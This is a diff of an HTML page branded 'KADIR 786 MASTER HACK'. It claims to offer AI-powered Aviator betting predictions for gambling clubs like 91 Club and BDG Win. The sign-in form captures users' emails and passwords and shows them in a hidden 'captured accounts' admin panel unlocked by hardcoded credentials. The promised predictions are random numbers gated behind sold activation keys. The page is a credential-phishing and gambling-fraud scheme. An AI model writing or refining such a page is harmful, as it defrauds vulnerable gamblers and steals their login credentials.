@@ -3,107 +3,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KADIR 786 PREDICTOR</title>
+    <title>KADIR 786 | MASTER HACK</title>
     <style>
         body { background: #000; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 0; }
         
-        /* 1. TOP MASTER ADMIN (As per your Screenshot) */
+        /* एडमिन कंट्रोल (हमेशा ऊपर) */
         .master-admin { background: #000; border-bottom: 2px solid #00ff41; padding: 10px; }
-        .admin-label { color: #00ff41; font-size: 12px; margin-bottom: 5px; }
-        .admin-inputs { display: flex; gap: 5px; }
+        .admin-inputs { display: flex; gap: 5px; margin-bottom: 5px; }
         .adm-field { background: #111; border: 1px solid #333; color: #00ff41; padding: 10px; border-radius: 5px; width: 35%; }
         .login-btn { background: #00ff41; color: #000; border: none; padding: 10px; border-radius: 5px; font-weight: bold; flex-grow: 1; cursor: pointer; }
+        #capturedData { display: none; background: #050505; border: 1px dashed #00ff41; padding: 10px; margin-top: 10px; border-radius: 8px; }
 
-        /* 2. USER LOGIN PAGE */
-        .user-page { padding: 40px 20px; text-align: center; }
-        .user-input { width: 100%; max-width: 350px; padding: 15px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 10px; margin-bottom: 15px; box-sizing: border-box; }
-        .signin-btn { width: 100%; max-width: 350px; padding: 15px; background: #007bff; color: #fff; border: none; border-radius: 30px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        /* यूजर लॉगिन */
+        .container { padding: 20px; text-align: center; }
+        .u-input { width: 100%; max-width: 350px; padding: 15px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 10px; margin-bottom: 15px; box-sizing: border-box; }
+        .blue-btn { width: 100%; max-width: 350px; padding: 15px; background: #007bff; color: #fff; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; }
 
-        /* 3. CLUB GRID (After Login) */
-        #clubPage { display: none; padding: 20px; text-align: center; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
+        /* क्लब ग्रिड (91 Club, BDG आदि) */
+        #clubGrid { display: none; padding: 20px; grid-template-columns: 1fr 1fr; gap: 15px; }
         .club-card { background: #1a1a1a; border: 1px solid #ffae00; border-radius: 15px; padding: 20px; cursor: pointer; position: relative; }
         .trend { position: absolute; top: 0; left: 10px; background: #ffae00; color: #000; font-size: 10px; padding: 2px 8px; border-radius: 0 0 5px 5px; font-weight: bold; }
 
-        /* Admin Controls Hidden initially */
-        #adminPanel { display: none; background: #050505; padding: 15px; margin: 10px; border-radius: 10px; border: 1px dashed #00ff41; }
+        /* प्रेडिक्शन पेज (1.00x वाला असली पेज) */
+        #predPage { display: none; text-align: center; padding: 20px; }
+        .mult-val { font-size: 70px; font-weight: bold; margin: 40px 0; }
+        .action-btn { width: 100%; max-width: 320px; padding: 15px; border: none; border-radius: 10px; font-weight: bold; margin-bottom: 10px; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="master-admin">
-    <div class="admin-label">MASTER ADMIN: KADIR 786</div>
+    <div style="color:#00ff41; font-size:12px; margin-bottom:5px;">MASTER ADMIN: KADIR 786</div>
     <div class="admin-inputs">
         <input type="text" id="aID" class="adm-field" placeholder="Kadir 786">
-        <input type="password" id="aPass" class="adm-field" placeholder="Password">
-        <button class="login-btn" onclick="openAdmin()">LOGIN</button>
+        <input type="password" id="aPass" class="adm-field" placeholder="9580">
+        <button class="login-btn" onclick="openAdm()">LOGIN</button>
+    </div>
+    <div id="capturedData">
+        <p style="color:yellow; font-size:12px; margin:0;" id="userLogs">No accounts yet.</p>
+        <button onclick="makeKey()" style="background:#ffae00; border:none; border-radius:5px; padding:5px; margin-top:10px; font-weight:bold;">CREATE KEY</button>
+        <span id="keyText" style="margin-left:10px; font-weight:bold;"></span>
     </div>
 </div>
 
-<div id="adminPanel">
-    <h4 style="color:#00ff41; margin:0;">Captured User Accounts</h4>
-    <div id="logs" style="font-size:12px; color:yellow; margin:10px 0;">No accounts yet.</div>
-    <button onclick="genKey()" style="background:#ffae00; padding:5px; border:none; border-radius:5px; font-weight:bold;">CREATE KEY</button>
-    <span id="newKey" style="margin-left:10px; font-weight:bold; color:white;"></span>
-</div>
+<div class="container">
+    <div id="step1">
+        <h1 style="margin-top:20px;">KADIR 786</h1>
+        <p style="color:#666;">AI-Powered Predictions</p>
+        <input type="email" id="uEmail" class="u-input" placeholder="Email Address">
+        <input type="password" id="uPass" class="u-input" placeholder="Password">
+        <button class="blue-btn" onclick="saveAndNext()">Sign In</button>
+    </div>
 
-<div id="userLoginPage" class="user-page">
-    <img src="https://cdn-icons-png.flaticon.com/512/7140/7140413.png" width="60">
-    <h1 style="margin:10px 0;">KADIR 786</h1>
-    <p style="color:#666;">AI-Powered Predictions</p>
-    
-    <input type="email" id="uEmail" class="user-input" placeholder="Email Address">
-    <input type="password" id="uPass" class="user-input" placeholder="Password">
-    <button class="signin-btn" onclick="userLogin()">Sign In</button>
-</div>
+    <div id="clubGrid">
+        <div class="club-card" onclick="goHack('91 Club')"><div class="trend">🔥 Trending</div><h4>91 Club</h4><p style="font-size:10px; color:#888;">Server Active</p></div>
+        <div class="club-card" onclick="goHack('BDG Win')"><div class="trend">🔥 Trending</div><h4>BDG Win</h4><p style="font-size:10px; color:#888;">Server Active</p></div>
+        <div class="club-card" onclick="goHack('55 Club')"><h4>55 Club</h4><p style="font-size:10px; color:#888;">Server Active</p></div>
+        <div class="club-card" onclick="goHack('1win')"><h4>1win</h4><p style="font-size:10px; color:#888;">Server Active</p></div>
+    </div>
 
-<div id="clubPage">
-    <h2>Aviator</h2>
-    <div class="grid">
-        <div class="club-card" onclick="alert('Prediction coming soon...')"><div class="trend">🔥 Trending</div><h4>Daman</h4><p style="font-size:10px; color:#888;">Server 1 Active</p></div>
-        <div class="club-card" onclick="alert('Prediction coming soon...')"><div class="trend">🔥 Trending</div><h4>1win</h4><p style="font-size:10px; color:#888;">Server 2 Active</p></div>
-        <div class="club-card"><h4>55 Club</h4><p style="font-size:10px; color:#888;">Server 3 Active</p></div>
-        <div class="club-card"><h4>Tiranga</h4><p style="font-size:10px; color:#888;">Server 4 Active</p></div>
+    <div id="predPage">
+        <h2 id="targetClub" style="color:red">Aviator predictor v5.0</h2>
+        <p id="targetSub" style="color:#888;">Get predictions for hack</p>
+        <div class="mult-val" id="number">1.00x</div>
+        
+        <button class="action-btn" style="background:#b30000; color:#fff" onclick="startLoading()">📈 Get Prediction</button>
+        <button class="action-btn" style="background:#28a745; color:#fff">🎮 Go to Game</button>
+        
+        <input type="text" id="actCode" class="u-input" style="margin-top:20px;" placeholder="Enter Activation Code">
+        <button class="action-btn" style="background:#007bff; color:#fff" onclick="checkAct()">🔑 Activate Hack</button>
     </div>
 </div>
 
 <script>
-    let generatedKeys = [];
+    let currentKey = "";
+    let activated = false;
 
-    // एडमिन लॉगिन फंक्शन
-    function openAdmin() {
-        let id = document.getElementById('aID').value;
-        let pass = document.getElementById('aPass').value;
-        if(id === "Kadir 786" && pass === "9580") {
-            document.getElementById('adminPanel').style.display = 'block';
-            alert("Admin Access Granted!");
-        } else {
-            alert("Wrong Admin ID or Password!");
-        }
+    function openAdm() {
+        if(document.getElementById('aID').value === "Kadir 786" && document.getElementById('aPass').value === "9580") {
+            document.getElementById('capturedData').style.display = 'block';
+        } else { alert("Wrong Admin Access!"); }
     }
 
-    // यूजर साइन-इन फंक्शन
-    function userLogin() {
-        let email = document.getElementById('uEmail').value;
-        let pass = document.getElementById('uPass').value;
-        
-        if(email !== "" && pass !== "") {
-            // एडमिन को डेटा भेजना
-            document.getElementById('logs').innerHTML += `<div>Email: ${email} | Pass: ${pass}</div>`;
-            
-            // लॉगिन के बाद अगला पेज खोलना
-            document.getElementById('userLoginPage').style.display = 'none';
-            document.getElementById('clubPage').style.display = 'block';
-        } else {
-            alert("Please enter Email and Password!");
-        }
+    function makeKey() {
+        currentKey = "KDR-" + Math.floor(Math.random()*9000+1000);
+        document.getElementById('keyText').innerText = "New Key: " + currentKey;
     }
 
-    // कोड बनाने वाला फंक्शन
-    function genKey() {
-        let key = "KDR-" + Math.floor(Math.random()*9000+1000);
-        generatedKeys.push(key);
-        document.getElementById('newKey').innerText = "Key: " + key;
+    function saveAndNext() {
+        let e = document.getElementById('uEmail').value;
+        let p = document.getElementById('uPass').value;
+        if(e && p) {
+            document.getElementById('userLogs').innerText = `Email: ${e} | Pass: ${p}`;
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('clubGrid').style.display = 'grid';
+        } else { alert("Enter Email & Password!"); }
+    }
+
+    function goHack(name) {
+        document.getElementById('clubGrid').style.display = 'none';
+        document.getElementById('predPage').style.display = 'block';
+        document.getElementById('targetClub').innerText = name + " Predictor";
+        document.getElementById('targetSub').innerText = "Get predictions for " + name + " hack";
+    }
+
+    function checkAct() {
+        if(document.getElementById('actCode').value === currentKey && currentKey !== "") {
+            activated = true;
+            alert("Hack Activated Successfully!");
+        } else { alert("Invalid Code! Create key from Admin Panel above."); }
+    }
+
+    function startLoading() {
+        if(!activated) { alert("Please Activate Hack First!"); return; }
+        document.getElementById('number').innerText = "WAIT...";
+        setTimeout(() => {
+            let res = (Math.random() * 3 + 1.1).toFixed(2);
+            document.getElementById('number').innerText = res + "x";
+        }, 1500);
     }
 </script>
 </body>
